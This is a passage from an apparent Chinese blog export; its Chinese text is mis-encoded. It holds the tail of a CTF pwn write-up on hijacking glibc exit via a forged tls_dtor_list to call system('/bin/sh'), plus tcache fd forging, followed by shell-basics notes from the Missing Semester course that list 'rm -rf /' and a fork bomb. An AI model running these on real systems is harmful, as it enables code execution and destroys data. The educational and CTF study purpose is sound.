NOTES for more detail.  */</span></span><br><span class="line">      <span class="built_in">atomic_fetch_add_release</span> (&amp;cur-&gt;map-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (__call_tls_dtors)</span><br></pre></td></tr></table></figure>

<p>å…¶ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destructor list</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">dtor_list</span></span><br><span class="line">&#123;</span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>PTR_DEMANGLE è¿™ä¸ªå®è®¡ç®—å‡½æ•°åœ°å€</p>
<ul>
<li>å¾ªç¯å³ç§»0x11ä½</li>
<li>ä¸ pointer_guard è¿›è¡Œå¼‚æˆ–</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			      \</span></span><br><span class="line"><span class="meta">				xor %fs:POINTER_GUARD, reg</span></span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå€¼ä¸º0ï¼Œä¸ä¼šè°ƒç”¨å¦‚ä¸‹çš„å‡½æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p tls_dtor_list</span><br><span class="line"><span class="variable">$1</span> = (struct dtor_list *) 0x0</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¿™é‡Œæ²¡æœ‰ä»€ä¹ˆæ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”»å‡»è¿™ä¸ªå€¼ï¼Œè®©å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ä¸€ä¸ª <code>dtor_list</code> ç»“æ„ä½“ã€‚</p>
<ul>
<li>func é¦–å…ˆè·å¾—åœ°å€ï¼Œå…ˆäº pointer_guard è¿›è¡Œå¼‚æˆ–ï¼Œç„¶ååœ¨è¿›è¡Œå¾ªç¯å·¦ç§»11ä½</li>
<li>obj ä½œä¸ºå‡½æ•°å‚æ•°æŒ‡é’ˆã€‚</li>
</ul>
<p>åœ¨æ±‡ç¼–ä¸­</p>
<ul>
<li>tls_dtor_list ä¹Ÿåœ¨ fs é™„è¿‘</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> tls_dtor_list=1   <span class="comment"># è¿›å…¥å¾ªç¯ï¼Œå¯»æ‰¾åç§»</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p <span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$4</span> = (void *) 0xffffffffffffffb0</span><br><span class="line">pwndbg&gt; p (long)<span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$5</span> = -80</span><br><span class="line"></span><br><span class="line">0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr [rip + 0x194773]</span><br><span class="line">0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:[rbp]</span><br><span class="line">0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span class="built_in">test</span>   rbx, rbx                        <span class="comment"># è¿™é‡Œå°±æ˜¯tls_dtor_list å€¼</span></span><br><span class="line">0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;</span><br><span class="line">0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr [rax + rax]</span><br><span class="line">â–º 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr [rbx + 0x18]   <span class="comment"># next æŒ‡é’ˆ</span></span><br><span class="line">0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr [rbx]            <span class="comment"># func</span></span><br><span class="line">0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span class="comment"># å¾ªç¯å³ç§»</span></span><br><span class="line">0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:[0x30]        <span class="comment"># pointer_guard </span></span><br><span class="line">0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:[rbp], rdx</span><br><span class="line">0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr [rbx + 8]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/xg <span class="variable">$fs_base</span>+0x30</span><br><span class="line">0x7ffff7dc1770: 0x851e64b26accf332</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦å°†ä¼ªé€ çš„ç»“æ„ä½“ä¸­å‡½æ•°åœ°å€è¿›è¡Œä¸€ä¸ªç§»ä½è¿ç®—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="keyword">return</span> ((addr &lt;&lt; <span class="number">0x11</span>) &amp; <span class="number">0xffffffffffffffff</span>) | (addr &gt;&gt; <span class="number">0x2f</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªå°demoï¼Œæ¥è‡ª <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-é€šè¿‡tls_dtor_liståŠ«æŒexitæ‰§è¡Œæµç¨‹</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">rotate_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value, <span class="type">int</span> left)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) * <span class="number">8</span> - left));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> index = <span class="number">0xffffffffffffffa8</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> tls_dtor_list_addr;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> random_number;</span><br><span class="line">  <span class="type">void</span> *system_ptr = (<span class="type">void</span> *)&amp;system;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system:%p\n&quot;</span>, system_ptr);</span><br><span class="line">  <span class="built_in">asm</span>(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fs_base));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);</span><br><span class="line">  tls_dtor_list_addr = fs_base - <span class="number">80</span>;</span><br><span class="line">  random_number = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(fs_base + <span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *str_bin_sh = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(str_bin_sh, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr =</span><br><span class="line">      <span class="built_in">rotate_left</span>((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)system_ptr ^ random_number, <span class="number">0x11</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(ptr + <span class="number">8</span>) = str_bin_sh;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)tls_dtor_list_addr = ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨é«˜ç‰ˆæœ¬ çš„ tcache bin attack é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚</p>
<ul>
<li>tcache fd åŠ å¯†é—®é¢˜ã€‚</li>
</ul>
<p>å¦‚ä¸‹ä¸º chunk æ”¾å…¥ tcache bin ç›¸å…³çš„å‡½æ•°ã€‚</p>
<ul>
<li>å› ä¸º header çš„å­˜åœ¨ï¼Œç¬¬ä¸€æ­¥å°† chunk è½¬åŒ–æˆ tcache_entry</li>
<li>key ä¸ºä¸€ä¸ªéšæœºæ•°</li>
<li>nextæŒ‡é’ˆè®¡ç®—ï¼ŒnextæŒ‡é’ˆçš„åœ°å€å³ç§»12ä½ï¼Œç„¶åä¸ <code>prev tcache bin</code> æŒ‡é’ˆè¿›è¡Œ <code>xor</code> è¿ç®—ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;                <span class="comment">// å¸¸è¯´çš„ fd æŒ‡é’ˆ </span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> </span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)<span class="built_in">chunk2mem</span>(chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;      <span class="comment">// ä¸€ä¸ªéšæœºæ•°ï¼Œtcache_key_initialize (void) ç”Ÿæˆ</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = <span class="built_in">PROTECT_PTR</span>(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åšä¸€ä¸ªæµ‹è¯•ï¼ŒæŸ¥çœ‹tcache çš„nextæŒ‡é’ˆã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x (0x5555555592f0 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line"><span class="variable">$1</span> = 0x55500000c7f9</span><br></pre></td></tr></table></figure>

<p>å› æ­¤æˆ‘ä»¬ä¼ªé€ fdã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(addr &gt;&gt; <span class="number">12</span>) ^ pos</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://kagehutatsu.com/?p=951">2023 é¹åŸæ¯ Pwn éƒ¨åˆ†Writeup</a></li>
<li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">é¹åŸæ¯2023 Writeup</a></li>
<li><a href="https://unauth401.tech/pcb2023/#baby-heap">é¹åŸæ¯ 2023 åˆèµ› Pwn WriteUp</a></li>
<li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023ç¬¬ä¸‰å±Šâ€œé¹åŸæ¯â€çº¿ä¸Šåˆèµ›WriteUp</a></li>
<li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¡ç®—æœºæ•™è‚²ç¼ºå¤±çš„ä¸€è¯¾</title>
    <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
    <content><![CDATA[<blockquote>
<p>the Missing Semester of your CS education</p>
</blockquote>
<span id="more"></span>

<p>The Missing Semester of your CS educationï¼Œå…±<code>11</code>èŠ‚è¯¾ï¼Œæ¯èŠ‚è¯¾çº¦1hã€‚</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili åŒè¯­å­—å¹•</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li>
</ul>
<p>ç¡®å®ä¸é”™ï¼Œæ‰‹æ•²å‘½ä»¤+è®²è§£ã€‚å¤šä½¿ç”¨Linux</p>
<p>å­¦æ ¡åº”è¯¥åœ¨å¤§ä¸€æ•™è¿™ä¸ªï¼Œè€Œä¸æ˜¯TMçš„å¤§å­¦ç‰©ç†</p>
<p>è¯¾ç¨‹ç½‘ç«™</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure>

<h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote>
<p>ä¸»è¦æ˜¯ Linux åŸºæœ¬å‘½ä»¤</p>
</blockquote>
<h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul>
<li>å¦‚ä½•åˆ©ç”¨å­˜åœ¨çš„å·¥å…·ä½¿æˆ‘ä»¬å¼€å‘æ›´åŠ é«˜æ•ˆï¼Œä»¥åŠå¦‚ä½•æ›´å¥½çš„åˆ©ç”¨æˆ‘ä»¬çš„è®¡ç®—æœºï¼Œè¿™æ˜¯è¿™é—¨è¯¾ä¸»è¦è§£å†³çš„é—®é¢˜ã€‚</li>
</ul>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>è®²è¿°äº†Linux Shell.ä¸»è¦æ˜¯bash</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">shellæ˜¯è¿è¡Œåœ¨ç»ˆç«¯ä¸­çš„æ–‡æœ¬äº’åŠ¨ç¨‹åºï¼Œbashï¼ˆGNU Bourne-Again Shellï¼‰æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§shellã€‚æ˜¯å½“å‰å¤§å¤šæ•°Linuxå‘è¡Œç‰ˆçš„é»˜è®¤Shellã€‚</span><br></pre></td></tr></table></figure>

<p>æ—¥æœŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<p>æ‰“å°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<p>è·¯å¾„åˆ—è¡¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å½“æˆ‘ä»¬æ‰§è¡Œä¸€äº›å‘½ä»¤æ—¶ï¼Œä¼šéå†PATHå¯»æ‰¾ï¼›æ¯”å¦‚è¯´ä½¿ç”¨ /bin/echo æ—¶åªéœ€åœ¨ç»ˆç«¯è¾“å…¥ echo å°±è¡Œ</span></span><br><span class="line"><span class="comment"># `:` åˆ†éš”</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>å¯»æ‰¾å‘½ä»¤çš„è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereiså¯ä»¥å¯»æ‰¾åˆ° åŸå§‹ä»£ç ã€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–æ˜¯å¸®åŠ©æ–‡ä»¶</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure>

<p>ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` ä»£è¡¨ä¸Šä¸€çº§ç›®å½•ã€‚`.` ä»£è¡¨å½“å‰ç›®å½• </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  å½“å‰ç›®å½•å’Œä¹‹å‰ç›®å½•ä¸‹åˆ‡æ¢</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰è¶£çš„ä¸€ç‚¹æ˜¯ï¼Œ`..`ä½¿ç”¨è¿‡å¤šçš„æƒ…å†µã€‚`/`ç›®å½•æ²¡æœ‰ä¸Šä¸€çº§ï¼Œæœ€é«˜åªèƒ½åˆ° `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶æ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  list: åˆ—å‡ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼Œé»˜è®¤å½“å‰ç›®å½•</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»åŠ¨æ–‡ä»¶ä½ç½® move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># é‡å‘½å</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶ copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r ä¹Ÿè¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰å†…å®¹</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶å¼€å¤´ç»“å°¾ï¼Œé»˜è®¤10è¡Œ</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat é‡å®šå‘</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># å¦‚æœæ²¡æœ‰å°±åˆ›å»ºtmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># åŒä¸Š</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; ä¼šæ¸…é™¤åŸå…ˆå†…å®¹ã€‚&gt;&gt; ä»£è¡¨appendï¼Œè¿½åŠ è€Œä¸æ¸…é™¤</span></span><br></pre></td></tr></table></figure>

<p>å‘½ä»¤å‚æ•°å’Œå¸®åŠ©æ–‡æ¡£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸€èˆ¬å‘½ä»¤ä¹Ÿå­˜åœ¨å‚æ•°ï¼Œä¸€èˆ¬ä¸º -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: æƒé™Read, Write, eXecute(ä¹Ÿä»£è¡¨æ˜¯å¦èƒ½å¤Ÿè®¿é—®æ­¤ç›®å½•)ã€‚</span></span><br><span class="line"><span class="comment"># ä»å‰åˆ°å: owneræƒé™ groupæƒé™ å…¶ä½™ç”¨æˆ·æƒé™ owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥å¸®åŠ©æ–‡æ¡£ï¼Œqé€€å‡ºã€‚manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure>

<p>ç®¡é“ï¼šå·¦ä¾§çš„è¾“å‡ºä½œä¸ºå³ä¾§çš„è¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 æœ€åä¸€è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰æ—¶å€™ç»™rootæƒé™æ–‡ä»¶å†™å…¥æ—¶ï¼Œæ¯”å¦‚sudo echo 123 &gt; tmp.txtä¼šæŠ¥é”™ï¼Œå¯ç”¨ä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure>

<p>root user: è¶…çº§ç®¡ç†å‘˜ã€‚å°½é‡å°‘ç”¨ï¼Œåœ¨è¿è¡Œé”™è¯¯çš„ç¨‹åºæ—¶ä¼šç ´åè®¡ç®—æœºã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨æˆ·ä½¿ç”¨rootæƒé™</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` ä»£è¡¨root æƒé™ </span></span><br></pre></td></tr></table></figure>

<p><code>/sys</code> æ–‡ä»¶å¤¹ï¼šå„ç§å†…æ ¸å‚æ•°ï¼Œæ˜¾ç¤ºè®¾å¤‡çš„çŠ¶æ€ã€‚linuxç³»ç»Ÿå°†å…¶è§†ä¸ºæ–‡ä»¶æš´æ¼ç»™ç”¨æˆ·ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ“ä½œä»è€Œæ§åˆ¶æŸäº›è®¾å¤‡</p>
<p>æœ‰è¶£çš„å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ åº“è·‘è·¯ï¼Œæ— éœ€ç¡®è®¤å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork ç‚¸å¼¹, ä¼šè€—å°½ç”µè„‘èµ„æº</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°é€’å½’è°ƒç”¨ `:` ä¸ºå‡½æ•°å</span></span><br><span class="line">:() &#123;</span><br><span class="line">	: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºlsæ‰“é”™é¢‘ç‡æ¯”è¾ƒé«˜ï¼Œä¼šå‡ºç°ä¸€ä¸ªåŠ¨ç”»(ç«è½¦)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay æ‰“å°ä¸€æ®µè¯ cowthink ç±»ä¼¼ï¼Œä½†æ˜¯think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">	-l æŸ¥çœ‹åŠ¨ç‰©ï¼Œéœ€è¦å®‰è£…</span><br><span class="line">	-f æŒ‡å®šåŠ¨ç‰©</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet å­—ç¬¦å­—  toiletç±»ä¼¼ </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°ä¸€å †ä¿¡æ¯å’Œlogoï¼Œè£…bä½¿ç”¨</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure>

<p>ç°ä»£åŒ–çš„å‘½ä»¤ï¼šå¼€å‘è€…ä½¿ç”¨rustå†™äº†å¾ˆå¤šæ›´åŠ ç°ä»£çš„å‘½ä»¤ï¼Œå¯ä»¥æ›¿ä»£ä¸€äº›è€å‘½ä»¤</p>
